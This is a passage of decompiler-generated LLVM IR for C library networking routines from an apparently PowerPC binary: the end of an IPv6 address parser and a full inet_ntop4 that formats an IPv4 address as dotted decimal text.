  %v3_10014370 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_10017538.500 to i32), i32 %v1_1001442835)
  store i32 %v3_10014370, i32* %r3.global-to-local, align 4
  %v3_10014374 = icmp eq i32 %v3_10014370, 0
  br i1 %v3_10014374, label %dec_label_pc_10014394, label %dec_label_pc_1001437c

dec_label_pc_1001437c:                            ; preds = %dec_label_pc_1001435c
  %v0_1001437c = load i32, i32* @r25, align 4
  %v2_1001437c = sub i32 %v3_10014370, %v0_1001437c
  store i32 %v2_1001437c, i32* %r0.global-to-local, align 4
  %v0_10014380 = load i32, i32* @r28, align 4
  %v1_10014380 = mul i32 %v0_10014380, 16
  store i32 %v1_10014380, i32* %r9.global-to-local, align 4
  %v2_10014384 = or i32 %v1_10014380, %v2_1001437c
  store i32 %v2_10014384, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_10014384, 65536
  br i1 %tmp19, label %dec_label_pc_10014420, label %dec_label_pc_100144d0

dec_label_pc_10014394:                            ; preds = %dec_label_pc_1001435c
  %v0_10014394 = load i32, i32* @r30, align 4
  %v3_10014394 = icmp eq i32 %v0_10014394, 58
  br i1 %v3_10014394, label %dec_label_pc_1001439c, label %dec_label_pc_100143f0

dec_label_pc_1001439c:                            ; preds = %dec_label_pc_10014394
  %v0_1001439c = load i32, i32* @r23, align 4
  %v3_1001439c = icmp eq i32 %v0_1001439c, 0
  br i1 %v3_1001439c, label %dec_label_pc_100143a4, label %dec_label_pc_100143b8

dec_label_pc_100143a4:                            ; preds = %dec_label_pc_1001439c
  %v0_100143a4 = load i32, i32* @r24, align 4
  %v3_100143a4 = icmp eq i32 %v0_100143a4, 0
  br i1 %v3_100143a4, label %dec_label_pc_100143ac, label %dec_label_pc_100144d0

dec_label_pc_100143ac:                            ; preds = %dec_label_pc_100143a4
  %v0_100143ac = load i32, i32* @r31, align 4
  store i32 %v0_100143ac, i32* @r24, align 4
  %v0_100143b0 = load i32, i32* @r29, align 4
  store i32 %v0_100143b0, i32* @r26, align 4
  br label %dec_label_pc_10014424.backedge

dec_label_pc_100143b8:                            ; preds = %dec_label_pc_1001439c
  %v0_100143b8 = load i32, i32* @r29, align 4
  %v1_100143b8 = inttoptr i32 %v0_100143b8 to i8*
  %v2_100143b8 = load i8, i8* %v1_100143b8, align 1
  %v3_100143b8 = zext i8 %v2_100143b8 to i32
  store i32 %v3_100143b8, i32* %r0.global-to-local, align 4
  %v3_100143bc = icmp eq i8 %v2_100143b8, 0
  br i1 %v3_100143bc, label %dec_label_pc_100144d0, label %dec_label_pc_100143c4

dec_label_pc_100143c4:                            ; preds = %dec_label_pc_100143b8
  %v0_100143c4 = load i32, i32* @r31, align 4
  %v1_100143c4 = add i32 %v0_100143c4, 2
  store i32 %v1_100143c4, i32* %r0.global-to-local, align 4
  %v1_100143c8 = load i32, i32* @r27, align 4
  %v3_100143c8 = icmp ugt i32 %v1_100143c4, %v1_100143c8
  br i1 %v3_100143c8, label %dec_label_pc_100144d0, label %dec_label_pc_100143d0

dec_label_pc_100143d0:                            ; preds = %dec_label_pc_100143c4
  %v0_100143d0 = load i32, i32* @r28, align 4
  %v1_100143d0 = udiv i32 %v0_100143d0, 256
  store i32 %v1_100143d0, i32* %r0.global-to-local, align 4
  %v1_100143d4 = trunc i32 %v0_100143d0 to i8
  %v3_100143d4 = add i32 %v0_100143c4, 1
  %v4_100143d4 = inttoptr i32 %v3_100143d4 to i8*
  store i8 %v1_100143d4, i8* %v4_100143d4, align 1
  %v0_100143d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100143d8 = trunc i32 %v0_100143d8 to i8
  %v2_100143d8 = load i32, i32* @r31, align 4
  %v3_100143d8 = inttoptr i32 %v2_100143d8 to i8*
  store i8 %v1_100143d8, i8* %v3_100143d8, align 1
  %v0_100143dc = load i32, i32* @r29, align 4
  store i32 %v0_100143dc, i32* @r26, align 4
  %v0_100143e0 = load i32, i32* @r31, align 4
  %v1_100143e0 = add i32 %v0_100143e0, 2
  store i32 %v1_100143e0, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001442430 = inttoptr i32 %v0_100143dc to i8*
  %v2_1001442431 = load i8, i8* %v1_1001442430, align 1
  %v3_1001442432 = zext i8 %v2_1001442431 to i32
  store i32 %v3_1001442432, i32* %r3.global-to-local, align 4
  store i32 268518444, i32* @lr, align 4
  %v1_1001442833 = call i32 @__GI_tolower(i32 %v3_1001442432)
  store i32 %v1_1001442833, i32* %r3.global-to-local, align 4
  store i32 %v1_1001442833, i32* @r30, align 4
  %v3_1001442c34 = icmp eq i32 %v1_1001442833, 0
  br i1 %v3_1001442c34, label %dec_label_pc_10014434, label %dec_label_pc_1001435c.lr.ph

dec_label_pc_1001435c.lr.ph:                      ; preds = %dec_label_pc_10014350, %dec_label_pc_100143d0
  %v1_100144283341 = phi i32 [ %v1_1001442833, %dec_label_pc_100143d0 ], [ %v1_100144283339, %dec_label_pc_10014350 ]
  br label %dec_label_pc_1001435c

dec_label_pc_100143f0:                            ; preds = %dec_label_pc_10014394
  %v3_100143f0 = icmp eq i32 %v0_10014394, 46
  br i1 %v3_100143f0, label %dec_label_pc_100143f8, label %dec_label_pc_100144d0

dec_label_pc_100143f8:                            ; preds = %dec_label_pc_100143f0
  %v0_100143f8 = load i32, i32* @r31, align 4
  %v1_100143f8 = add i32 %v0_100143f8, 4
  store i32 %v1_100143f8, i32* @r30, align 4
  %v1_100143fc = load i32, i32* @r27, align 4
  %v3_100143fc = icmp ugt i32 %v1_100143f8, %v1_100143fc
  br i1 %v3_100143fc, label %dec_label_pc_100144d0, label %dec_label_pc_10014404

dec_label_pc_10014404:                            ; preds = %dec_label_pc_100143f8
  %v0_10014408 = load i32, i32* @r26, align 4
  store i32 %v0_10014408, i32* %r3.global-to-local, align 4
  store i32 268518416, i32* @lr, align 4
  %v3_1001440c = call i32 @inet_pton4(i32 %v0_10014408, i32 %v0_100143f8)
  store i32 %v3_1001440c, i32* %r3.global-to-local, align 4
  %v0_10014410 = load i32, i32* @r30, align 4
  store i32 %v0_10014410, i32* @r31, align 4
  %v2_10014414 = icmp sgt i32 %v3_1001440c, 0
  br i1 %v2_10014414, label %dec_label_pc_10014458, label %dec_label_pc_100144d0

dec_label_pc_10014420:                            ; preds = %dec_label_pc_1001437c
  store i32 1, i32* @r23, align 4
  %v0_10014424.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10014424.backedge

dec_label_pc_10014424.backedge:                   ; preds = %dec_label_pc_10014420, %dec_label_pc_100143ac
  %v0_10014424.be = phi i32 [ %v0_10014424.pre.pre, %dec_label_pc_10014420 ], [ %v0_100143b0, %dec_label_pc_100143ac ]
  %v1_10014424 = inttoptr i32 %v0_10014424.be to i8*
  %v2_10014424 = load i8, i8* %v1_10014424, align 1
  %v3_10014424 = zext i8 %v2_10014424 to i32
  store i32 %v3_10014424, i32* %r3.global-to-local, align 4
  store i32 268518444, i32* @lr, align 4
  %v1_10014428 = call i32 @__GI_tolower(i32 %v3_10014424)
  store i32 %v1_10014428, i32* %r3.global-to-local, align 4
  store i32 %v1_10014428, i32* @r30, align 4
  %v3_1001442c = icmp eq i32 %v1_10014428, 0
  br i1 %v3_1001442c, label %dec_label_pc_10014434, label %dec_label_pc_1001435c

dec_label_pc_10014434:                            ; preds = %dec_label_pc_10014424.backedge, %dec_label_pc_10014350, %dec_label_pc_100143d0
  %v0_10014434 = load i32, i32* @r23, align 4
  %v3_10014434 = icmp eq i32 %v0_10014434, 0
  %v0_1001449c.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014434, label %dec_label_pc_10014458, label %dec_label_pc_1001443c

dec_label_pc_1001443c:                            ; preds = %dec_label_pc_10014434
  %v1_1001443c = add i32 %v0_1001449c.pre.pre, 2
  store i32 %v1_1001443c, i32* %r0.global-to-local, align 4
  %v1_10014440 = load i32, i32* @r27, align 4
  %v3_10014440 = icmp ugt i32 %v1_1001443c, %v1_10014440
  br i1 %v3_10014440, label %dec_label_pc_100144d0, label %dec_label_pc_10014448

dec_label_pc_10014448:                            ; preds = %dec_label_pc_1001443c
  %v0_10014448 = load i32, i32* @r28, align 4
  %v1_10014448 = udiv i32 %v0_10014448, 256
  store i32 %v1_10014448, i32* %r0.global-to-local, align 4
  %v1_1001444c = trunc i32 %v0_10014448 to i8
  %v3_1001444c = add i32 %v0_1001449c.pre.pre, 1
  %v4_1001444c = inttoptr i32 %v3_1001444c to i8*
  store i8 %v1_1001444c, i8* %v4_1001444c, align 1
  %v0_10014450 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014450 = trunc i32 %v0_10014450 to i8
  %v2_10014450 = load i32, i32* @r31, align 4
  %v3_10014450 = inttoptr i32 %v2_10014450 to i8*
  store i8 %v1_10014450, i8* %v3_10014450, align 1
  %v0_10014454 = load i32, i32* @r31, align 4
  %v1_10014454 = add i32 %v0_10014454, 2
  store i32 %v1_10014454, i32* @r31, align 4
  br label %dec_label_pc_10014458

dec_label_pc_10014458:                            ; preds = %dec_label_pc_10014434, %dec_label_pc_10014404, %dec_label_pc_10014448
  %v0_1001449c.pre = phi i32 [ %v0_10014410, %dec_label_pc_10014404 ], [ %v1_10014454, %dec_label_pc_10014448 ], [ %v0_1001449c.pre.pre, %dec_label_pc_10014434 ]
  %v0_10014458 = load i32, i32* @r24, align 4
  %v3_10014458 = icmp eq i32 %v0_10014458, 0
  %v1_1001449c.pre = load i32, i32* @r27, align 4
  %v4_1001449c = icmp eq i32 %v0_1001449c.pre, %v1_1001449c.pre
  br i1 %v3_10014458, label %dec_label_pc_1001449c, label %dec_label_pc_10014460

dec_label_pc_10014460:                            ; preds = %dec_label_pc_10014458
  %v2_10014464 = sub i32 %v0_1001449c.pre, %v0_10014458
  store i32 %v2_10014464, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br i1 %v4_1001449c, label %dec_label_pc_100144d0, label %dec_label_pc_10014484.preheader

dec_label_pc_10014484.preheader:                  ; preds = %dec_label_pc_10014460
  %v3_1001448424 = icmp slt i32 %v2_10014464, 1
  %v2_1001448826 = add i32 %v2_10014464, -1
  store i32 %v2_1001448826, i32* @r10, align 4
  %v2_1001448c27 = add i32 %v1_1001449c.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1001448424, label %dec_label_pc_1001449c.thread, label %dec_label_pc_10014478

dec_label_pc_10014478:                            ; preds = %dec_label_pc_10014484.preheader, %dec_label_pc_10014478.dec_label_pc_10014478_crit_edge
  %v0_10014478 = phi i32 [ %v0_10014478.pre, %dec_label_pc_10014478.dec_label_pc_10014478_crit_edge ], [ %v0_10014458, %dec_label_pc_10014484.preheader ]
  %v2_1001448c29 = phi i32 [ %v2_1001448c, %dec_label_pc_10014478.dec_label_pc_10014478_crit_edge ], [ %v2_1001448c27, %dec_label_pc_10014484.preheader ]
  %v2_1001448828 = phi i32 [ %v2_10014488, %dec_label_pc_10014478.dec_label_pc_10014478_crit_edge ], [ %v2_1001448826, %dec_label_pc_10014484.preheader ]
  %v2_10014478 = add i32 %v0_10014478, %v2_1001448828
  %v3_10014478 = inttoptr i32 %v2_10014478 to i8*
  %v4_10014478 = load i8, i8* %v3_10014478, align 1
  %v5_10014478 = zext i8 %v4_10014478 to i32
  store i32 %v5_10014478, i32* %r0.global-to-local, align 4
  %v3_1001447c = inttoptr i32 %v2_1001448c29 to i8*
  store i8 %v4_10014478, i8* %v3_1001447c, align 1
  %v0_10014480 = load i32, i32* @r8, align 4
  %v1_10014480 = load i32, i32* @r24, align 4
  %v2_10014480 = load i32, i32* @r10, align 4
  %v3_10014480 = trunc i32 %v0_10014480 to i8
  %v4_10014480 = add i32 %v2_10014480, %v1_10014480
  %v5_10014480 = inttoptr i32 %v4_10014480 to i8*
  store i8 %v3_10014480, i8* %v5_10014480, align 1
  %v0_10014484.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10014484.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1001448c.pre = load i32, i32* @r27, align 4
  %v3_10014484 = icmp slt i32 %v1_10014484.pre, %v0_10014484.pre
  %v2_10014488 = sub i32 %v1_10014484.pre, %v0_10014484.pre
  store i32 %v2_10014488, i32* @r10, align 4
  %v1_10014490 = add i32 %v0_10014484.pre, 1
  store i32 %v1_10014490, i32* %r9.global-to-local, align 4
  br i1 %v3_10014484, label %dec_label_pc_1001449c.thread, label %dec_label_pc_10014478.dec_label_pc_10014478_crit_edge

dec_label_pc_10014478.dec_label_pc_10014478_crit_edge: ; preds = %dec_label_pc_10014478
  %v2_1001448c = sub i32 %v1_1001448c.pre, %v0_10014484.pre
  %v0_10014478.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_10014478

dec_label_pc_1001449c.thread:                     ; preds = %dec_label_pc_10014478, %dec_label_pc_10014484.preheader
  %v0_10014498.lcssa = phi i32 [ %v1_1001449c.pre, %dec_label_pc_10014484.preheader ], [ %v1_1001448c.pre, %dec_label_pc_10014478 ]
  store i32 %v0_10014498.lcssa, i32* @r31, align 4
  br label %dec_label_pc_100144a4

dec_label_pc_1001449c:                            ; preds = %dec_label_pc_10014458
  br i1 %v4_1001449c, label %dec_label_pc_100144a4, label %dec_label_pc_100144d0

dec_label_pc_100144a4:                            ; preds = %dec_label_pc_1001449c.thread, %dec_label_pc_1001449c
  %v0_100144a4 = load i32, i32* @r22, align 4
  store i32 %v0_100144a4, i32* @r3, align 4
  store i32 %v2_10014320, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100144b4.501 to i32), i32* @lr, align 4
  %v0_100144b0 = call i32 @memcpy()
  store i32 %v0_100144b0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100144d4

dec_label_pc_100144bc:                            ; preds = %dec_label_pc_10014300
  %v0_100144bc = call i32 @__errno_location()
  store i32 %v0_100144bc, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100144c8 = inttoptr i32 %v0_100144bc to i32*
  store i32 97, i32* %v2_100144c8, align 4
  %v0_100144d8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100144d4

dec_label_pc_100144d0:                            ; preds = %dec_label_pc_100143c4, %dec_label_pc_100143b8, %dec_label_pc_1001437c, %dec_label_pc_100143a4, %dec_label_pc_10014460, %dec_label_pc_10014404, %dec_label_pc_100143f0, %dec_label_pc_1001449c, %dec_label_pc_10014344, %dec_label_pc_1001443c, %dec_label_pc_100143f8
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100144d4

dec_label_pc_100144d4:                            ; preds = %dec_label_pc_100144bc, %dec_label_pc_100144a4, %dec_label_pc_1001430c, %dec_label_pc_100144d0
  %v0_100144d8 = phi i32 [ %v0_100144d8.pre, %dec_label_pc_100144bc ], [ 1, %dec_label_pc_100144a4 ], [ %v3_10014314, %dec_label_pc_1001430c ], [ 0, %dec_label_pc_100144d0 ]
  store i32 %v0_100142e4, i32* %r0.global-to-local, align 4
  store i32 %v0_100144d8, i32* %r3.global-to-local, align 4
  ret i32 %v0_100144d8

; uselistorder directives
  uselistorder i32 %v0_100144d8, { 1, 0 }
  uselistorder i32 %v2_10014488, { 1, 0 }
  uselistorder i32 %v0_10014484.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1001449c, { 1, 0 }
  uselistorder i32 %v0_1001449c.pre, { 1, 0 }
  uselistorder i32 %v0_10014448, { 1, 0 }
  uselistorder i32 %v0_1001449c.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10014428, { 1, 2, 3, 0 }
  uselistorder i32 %v0_100143d0, { 1, 0 }
  uselistorder i32 %v1_10014380, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 16, 8, 9, 12, 13, 10, 11, 2, 1, 17, 4, 3, 5, 14, 18, 15, 0 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268518444, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_100144d4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100144d0, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_100144a4, { 1, 0 }
  uselistorder label %dec_label_pc_10014478, { 1, 0 }
  uselistorder label %dec_label_pc_10014458, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014434, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001435c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1001435c, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10014544.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_100144ec = load i32, i32* @lr, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_10014518 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_10014518, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_10014528.504 to i32), i32* @lr, align 4
  %v3_10014524 = call i32 @__GI_memset(i32 %v2_10014518, i32 0, i32 15)
  store i32 %v3_10014524, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_100145e82 = load i32, i32* @r1, align 4
  store i32 %v0_100145e82, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10014544

dec_label_pc_10014544:                            ; preds = %dec_label_pc_100145b8.dec_label_pc_10014544_crit_edge, %dec_label_pc_10014544.lr.ph
  %v2_10014564 = phi i32 [ %v2_100145e8, %dec_label_pc_100145b8.dec_label_pc_10014544_crit_edge ], [ %v0_100145e82, %dec_label_pc_10014544.lr.ph ]
  %v0_10014558 = phi i32 [ %v0_100145e8, %dec_label_pc_100145b8.dec_label_pc_10014544_crit_edge ], [ %v0_100145e82, %dec_label_pc_10014544.lr.ph ]
  %v0_10014548 = phi i32 [ %v1_100145e8, %dec_label_pc_100145b8.dec_label_pc_10014544_crit_edge ], [ 0, %dec_label_pc_10014544.lr.ph ]
  %v1_10014550 = phi i32 [ %v1_10014544.pre, %dec_label_pc_100145b8.dec_label_pc_10014544_crit_edge ], [ 0, %dec_label_pc_10014544.lr.ph ]
  %v0_10014544 = load i32, i32* %r31.global-to-local, align 4
  %v2_10014544 = add i32 %v0_10014544, %v1_10014550
  %v3_10014544 = inttoptr i32 %v2_10014544 to i8*
  %v4_10014544 = load i8, i8* %v3_10014544, align 1
  %v5_10014544 = zext i8 %v4_10014544 to i32
  store i32 %v5_10014544, i32* %r10.global-to-local, align 4
  store i32 %v0_10014548, i32* %r8.global-to-local, align 4
  %v1_1001454c = add i32 %v0_10014548, 1
  store i32 %v1_1001454c, i32* %r11.global-to-local, align 4
  store i32 %v2_10014544, i32* %r3.global-to-local, align 4
  %v1_10014554 = load i32, i32* @r28, align 4
  %v2_10014554 = udiv i32 %v5_10014544, %v1_10014554
  %v2_10014558 = add i32 %v1_1001454c, %v0_10014558
  store i32 %v2_10014558, i32* %r6.global-to-local, align 4
  %v1_1001455c = add nuw nsw i32 %v2_10014554, 48
  %v1_10014560 = urem i32 %v1_1001455c, 256
  store i32 %v1_10014560, i32* %r0.global-to-local, align 4
  %v1_10014564 = trunc i32 %v1_1001455c to i8
  %v3_10014564 = add i32 %v2_10014564, 8
  %v4_10014564 = inttoptr i32 %v3_10014564 to i8*
  store i8 %v1_10014564, i8* %v4_10014564, align 1
  %v0_10014568 = load i32, i32* %r0.global-to-local, align 4
  %v3_10014568 = icmp eq i32 %v0_10014568, 48
  %v0_10014570 = load i32, i32* %r10.global-to-local, align 4
  %v1_10014570 = load i32, i32* %r5.global-to-local, align 4
  %v2_10014570 = udiv i32 %v0_10014570, %v1_10014570
  store i32 %v2_10014570, i32* %r9.global-to-local, align 4
  br i1 %v3_10014568, label %dec_label_pc_10014570, label %dec_label_pc_1001459c

dec_label_pc_10014570:                            ; preds = %dec_label_pc_10014544
  %v2_10014574 = udiv i32 %v2_10014570, %v1_10014570
  %tmp18 = mul i32 %v2_10014574, -10
  %v2_1001457c = add i32 %v2_10014570, 48
  %v1_10014580 = add i32 %v2_1001457c, %tmp18
  store i32 %v1_10014580, i32* %r9.global-to-local, align 4
  %v1_10014584 = urem i32 %v1_10014580, 256
  store i32 %v1_10014584, i32* %r0.global-to-local, align 4
  %v1_10014588 = trunc i32 %v1_10014580 to i8
  %v2_10014588 = load i32, i32* %r7.global-to-local, align 4
  %v3_10014588 = add i32 %v2_10014588, 8
  %v4_10014588 = inttoptr i32 %v3_10014588 to i8*
  store i8 %v1_10014588, i8* %v4_10014588, align 1
  %v0_1001458c = load i32, i32* %r0.global-to-local, align 4
  %v3_1001458c = icmp eq i32 %v0_1001458c, 48
  br i1 %v3_1001458c, label %dec_label_pc_100145b8, label %dec_label_pc_10014594

dec_label_pc_10014594:                            ; preds = %dec_label_pc_10014570
  %v0_10014594 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10014594, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100145b8

dec_label_pc_1001459c:                            ; preds = %dec_label_pc_10014544
  %v0_100145a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100145a0 = add i32 %v0_100145a0, 1
  store i32 %v1_100145a0, i32* %r8.global-to-local, align 4
  %v2_100145a4 = udiv i32 %v2_10014570, %v1_10014570
  %v1_100145a8 = mul i32 %v2_100145a4, 10
  store i32 %v1_100145a8, i32* %r0.global-to-local, align 4
  %v2_100145ac = sub i32 %v2_10014570, %v1_100145a8
  %v1_100145b0 = add i32 %v2_100145ac, 48
  store i32 %v1_100145b0, i32* %r9.global-to-local, align 4
  %v1_100145b4 = trunc i32 %v1_100145b0 to i8
  %v2_100145b4 = load i32, i32* %r6.global-to-local, align 4
  %v3_100145b4 = add i32 %v2_100145b4, 8
  %v4_100145b4 = inttoptr i32 %v3_100145b4 to i8*
  store i8 %v1_100145b4, i8* %v4_100145b4, align 1
  br label %dec_label_pc_100145b8

dec_label_pc_100145b8:                            ; preds = %dec_label_pc_10014570, %dec_label_pc_10014594, %dec_label_pc_1001459c
  %v0_100145b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100145b8 = inttoptr i32 %v0_100145b8 to i8*
  %v2_100145b8 = load i8, i8* %v1_100145b8, align 1
  %v3_100145b8 = zext i8 %v2_100145b8 to i32
  %v0_100145bc = load i32, i32* %r8.global-to-local, align 4
  %v1_100145bc = add i32 %v0_100145bc, 1
  %v0_100145c0 = load i32, i32* @r1, align 4
  %v2_100145c0 = add i32 %v0_100145c0, %v0_100145bc
  store i32 %v2_100145c0, i32* %r10.global-to-local, align 4
  %v2_100145c4 = add i32 %v1_100145bc, %v0_100145c0
  store i32 %v2_100145c4, i32* %r8.global-to-local, align 4
  %v1_100145c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_100145c8 = udiv i32 %v3_100145b8, %v1_100145c8
  %v1_100145cc = add i32 %v0_100145bc, 2
  store i32 %v1_100145cc, i32* %r11.global-to-local, align 4
  %v0_100145d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100145d0 = add i32 %v0_100145d0, 1
  store i32 %v1_100145d0, i32* %r4.global-to-local, align 4
  %v1_100145d4 = mul nuw nsw i32 %v2_100145c8, 10
  store i32 %v1_100145d4, i32* %r0.global-to-local, align 4
  %v2_100145d8 = sub nsw i32 %v3_100145b8, %v1_100145d4
  %v1_100145dc = add nsw i32 %v2_100145d8, 48
  store i32 %v1_100145dc, i32* %r9.global-to-local, align 4
  %v1_100145e0 = trunc i32 %v1_100145dc to i8
  %v3_100145e0 = add i32 %v2_100145c0, 8
  %v4_100145e0 = inttoptr i32 %v3_100145e0 to i8*
  store i8 %v1_100145e0, i8* %v4_100145e0, align 1
  %v0_100145e4 = load i32, i32* %r12.global-to-local, align 4
  %v1_100145e4 = trunc i32 %v0_100145e4 to i8
  %v2_100145e4 = load i32, i32* %r8.global-to-local, align 4
  %v3_100145e4 = add i32 %v2_100145e4, 8
  %v4_100145e4 = inttoptr i32 %v3_100145e4 to i8*
  store i8 %v1_100145e4, i8* %v4_100145e4, align 1
  %v0_100145e8 = load i32, i32* @r1, align 4
  %v1_100145e8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100145e8 = add i32 %v1_100145e8, %v0_100145e8
  store i32 %v2_100145e8, i32* %r7.global-to-local, align 4
  %v0_100145ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_100145ec = add i32 %v0_100145ec, -1
  store i32 %v1_100145ec, i32* %ctr.global-to-local, align 4
  %v2_100145ec = icmp eq i32 %v1_100145ec, 0
  br i1 %v2_100145ec, label %dec_label_pc_100145f0, label %dec_label_pc_100145b8.dec_label_pc_10014544_crit_edge

dec_label_pc_100145b8.dec_label_pc_10014544_crit_edge: ; preds = %dec_label_pc_100145b8
  %v1_10014544.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10014544

dec_label_pc_100145f0:                            ; preds = %dec_label_pc_100145b8
  %v2_100145f0 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_100145f0, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100145f8 = add i32 %v1_100145e8, %v2_100145f0
  store i32 %v2_100145f8, i32* %r9.global-to-local, align 4
  store i32 %v2_100145f0, i32* @r3, align 4
  %v3_10014600 = add i32 %v2_100145f8, -1
  %v4_10014600 = inttoptr i32 %v3_10014600 to i8*
  store i8 0, i8* %v4_10014600, align 1
  %v0_10014604 = call i32 @__GI_strlen()
  store i32 %v0_10014604, i32* %r3.global-to-local, align 4
  %v1_10014608 = load i32, i32* @r30, align 4
  %v3_10014608 = icmp ugt i32 %v0_10014604, %v1_10014608
  br i1 %v3_10014608, label %dec_label_pc_10014610, label %dec_label_pc_10014624

dec_label_pc_10014610:                            ; preds = %dec_label_pc_100145f0
  %v0_10014610 = call i32 @__errno_location()
  store i32 %v0_10014610, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1001461c = inttoptr i32 %v0_10014610 to i32*
  store i32 28, i32* %v2_1001461c, align 4
  %v0_10014638.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014634

dec_label_pc_10014624:                            ; preds = %dec_label_pc_100145f0
  %v0_10014624 = load i32, i32* @r29, align 4
  store i32 %v0_10014624, i32* %r3.global-to-local, align 4
  store i32 %v2_100145f0, i32* %r4.global-to-local, align 4
  %v2_1001462c = bitcast i16* %stack_var_-56 to i8*
  %v3_1001462c = call i32 @strcpy(i32 %v0_10014624, i8* %v2_1001462c)
  store i32 %v3_1001462c, i32* %r3.global-to-local, align 4
  store i32 %v3_1001462c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014634

dec_label_pc_10014634:                            ; preds = %dec_label_pc_10014610, %dec_label_pc_10014624
  %v0_10014638 = phi i32 [ %v0_10014638.pre, %dec_label_pc_10014610 ], [ %v3_1001462c, %dec_label_pc_10014624 ]
  store i32 %v0_100144ec, i32* %r0.global-to-local, align 4
  store i32 %v0_10014638, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014638

; uselistorder directives
  uselistorder i32 %v0_10014638, { 1, 0 }
  uselistorder i32 %v2_100145f0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100145ec, { 1, 0 }
  uselistorder i32 %v2_100145e8, { 1, 0 }
  uselistorder i32 %v0_100145bc, { 1, 0, 2 }
  uselistorder i32 %v1_10014580, { 1, 0, 2 }
  uselistorder i32 %v2_10014570, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1001455c, { 1, 0 }
  uselistorder i32 %v0_10014548, { 1, 0 }
  uselistorder i32 %v0_100145e82, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
